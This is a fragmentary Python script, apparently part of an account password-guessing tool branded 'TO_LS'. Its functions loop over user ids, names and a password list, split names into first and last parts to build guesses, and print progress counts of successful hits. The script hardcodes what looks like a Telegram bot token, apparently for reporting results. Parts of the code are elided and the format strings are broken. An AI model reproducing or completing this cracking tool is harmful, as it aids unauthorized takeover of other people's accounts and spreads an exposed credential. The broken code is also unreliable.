...
if now >=target:print("MD7developer tools have   been activated ⛄@TO_LS⛄")
def a(z):
        for e in z:
            sys.stdout.write(e)
            sys.stdout.flush()
...
token = ('7082331019:AAEeRqWrrb5kUxlIqn4IVHb8WbKCcyz63Zs')
...
def api(ids,names,passlist):
                try:
                        global ok,loop,lim
                        p=round(loop*100/lim,2)
                        sys.stdout.write('\r\r\033[1;37m [TO_LS] '%(loop,len(oks),p));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
...
def api1(ids,names,passlist):
                try:
                        global ok,loop,lim
                        p=round(loop*100/lim,2)
                        sys.stdout.write('\r\r\033[1;37m [TO_LS] [%s] '%(loop,len(oks),p));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
